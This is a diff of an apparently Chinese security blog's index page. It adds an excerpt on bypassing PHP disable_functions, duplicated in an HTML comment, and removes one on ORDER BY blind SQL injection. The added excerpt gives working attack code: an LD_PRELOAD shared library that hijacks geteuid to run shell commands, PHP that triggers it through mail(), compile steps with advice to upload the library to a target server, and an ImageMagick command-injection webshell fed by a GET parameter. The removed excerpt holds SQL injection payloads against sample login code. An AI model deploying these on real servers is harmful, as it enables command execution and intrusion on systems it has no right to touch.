@@ -117,6 +117,144 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
+&#125;
+int geteuid() &#123;
+if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
+mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 使用方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
+gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
+<p>====<br>2018.8.22:</p>
+<p>使用imageMagick 绕过:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
+
+$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
+if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
+    $command &#x3D; &#39;id&#39;;
+&#125;
+
+$exploit &#x3D; &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
+pop graphic-context
+EOF;
+
+file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
+$thumb &#x3D; new Imagick();
+$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
+$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;KKKK.mvg&quot;);
+unlink(&quot;KKKK.png&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的比较老，最新的imagemagic漏洞:</p>
+	
+
+	</div>
+  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() &#123;
+system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
+&#125;
+int geteuid() &#123;
+if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
+mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 使用方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
+gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
+<p>====<br>2018.8.22:</p>
+<p>使用imageMagick 绕过:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
+
+$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
+if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
+    $command &#x3D; &#39;id&#39;;
+&#125;
+
+$exploit &#x3D; &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
+pop graphic-context
+EOF;
+
+file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
+$thumb &#x3D; new Imagick();
+$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
+$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;KKKK.mvg&quot;);
+unlink(&quot;KKKK.png&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的比较老，最新的imagemagic漏洞:</p>
+	
+	</div>
+  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/12/11/producer-consumer.html" >生产者消费者模型</a>
 		</h3>
 		</div>
@@ -917,158 +1055,6 @@ mysql<span class="token operator">></span> <span class="token keyword">select</s
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/11/23/order-by-blind.html" >基于order by的盲注</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-11-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-  $dbhost &#x3D; &quot;172.19.0.2&quot;;
-  $dbuser &#x3D; &quot;root&quot;;
-  $dbpass &#x3D; &quot;root&quot;;
-  $db &#x3D; &quot;vul&quot;;
-  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
-  mysqli_set_charset($conn,&quot;utf8&quot;);
- 
-  &#x2F;* sql
- 
-     create  table &#96;admin&#96; (
-        &#96;id&#96; int(10) not null primary key auto_increment,
-        &#96;username&#96; varchar(20) not null ,
-        &#96;password&#96; varchar(32) not null
-     );
-  *&#x2F;
-function   filter($str)&#123;
-      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
-      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
-      if(preg_match($filterlist,strtolower($str)))&#123;
-        die(&quot;illegal input!&quot;);
-      &#125;
-      return $str;
-  &#125;
-$username &#x3D; isset($_POST[&#39;username&#39;])?
-filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
-$password &#x3D; isset($_POST[&#39;password&#39;])?
-filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
-$sql &#x3D; &quot;select * from admin where  username &#x3D;
- &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
- 
-$res &#x3D; $conn -&gt; query($sql);
-if($res-&gt;num_rows&gt;0)&#123;
-  $row &#x3D; $res -&gt; fetch_assoc();
-  if($row[&#39;id&#39;])&#123;
-     echo $row[&#39;username&#39;];
-  &#125;
-&#125;else&#123;
-   echo &quot;The content in the password column is the &quot;;
-&#125;
- 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
-<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
-<p><img src="/2017/11/23/order-by-blind/2.png"></p>
-<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
-select * from admin where username&#x3D;&#39;&#39;&#x2F;2
-select * from admin where username&#x3D;&#39;&#39;^1^1
-select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后是基于order by的盲注：</p>
-<p>首先是基本知识:</p>
-	
-
-	</div>
-  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-  $dbhost &#x3D; &quot;172.19.0.2&quot;;
-  $dbuser &#x3D; &quot;root&quot;;
-  $dbpass &#x3D; &quot;root&quot;;
-  $db &#x3D; &quot;vul&quot;;
-  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
-  mysqli_set_charset($conn,&quot;utf8&quot;);
- 
-  &#x2F;* sql
- 
-     create  table &#96;admin&#96; (
-        &#96;id&#96; int(10) not null primary key auto_increment,
-        &#96;username&#96; varchar(20) not null ,
-        &#96;password&#96; varchar(32) not null
-     );
-  *&#x2F;
-function   filter($str)&#123;
-      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
-      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
-      if(preg_match($filterlist,strtolower($str)))&#123;
-        die(&quot;illegal input!&quot;);
-      &#125;
-      return $str;
-  &#125;
-$username &#x3D; isset($_POST[&#39;username&#39;])?
-filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
-$password &#x3D; isset($_POST[&#39;password&#39;])?
-filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
-$sql &#x3D; &quot;select * from admin where  username &#x3D;
- &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
- 
-$res &#x3D; $conn -&gt; query($sql);
-if($res-&gt;num_rows&gt;0)&#123;
-  $row &#x3D; $res -&gt; fetch_assoc();
-  if($row[&#39;id&#39;])&#123;
-     echo $row[&#39;username&#39;];
-  &#125;
-&#125;else&#123;
-   echo &quot;The content in the password column is the &quot;;
-&#125;
- 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
-<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
-<p><img src="/2017/11/23/order-by-blind/2.png"></p>
-<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
-select * from admin where username&#x3D;&#39;&#39;&#x2F;2
-select * from admin where username&#x3D;&#39;&#39;^1^1
-select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后是基于order by的盲注：</p>
-<p>首先是基本知识:</p>
-	
-	</div>
-  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1120,7 +1106,7 @@ select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>5</span></a></li>
+			<li><a href="/categories/Java/">Java<span>6</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -1147,6 +1133,10 @@ select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
@@ -1160,10 +1150,6 @@ select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="
     
       <li>
         <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
       </li>
     
   </ul>
